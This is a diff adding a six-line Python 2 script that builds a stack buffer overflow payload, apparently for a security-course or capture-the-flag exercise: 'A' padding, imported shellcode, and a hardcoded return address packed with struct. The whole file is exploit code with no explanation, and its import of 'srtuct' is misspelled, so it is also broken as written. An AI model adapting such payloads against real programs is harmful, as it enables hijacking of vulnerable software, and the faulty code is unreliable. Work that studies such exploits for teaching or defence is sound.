@@ -1,0 +1,6 @@
+from shellcode import shellcode 
+from srtuct import pack
+
+print "A"*(108-53)+shellcode+pack("<I", 0xbffff56b)
+
+
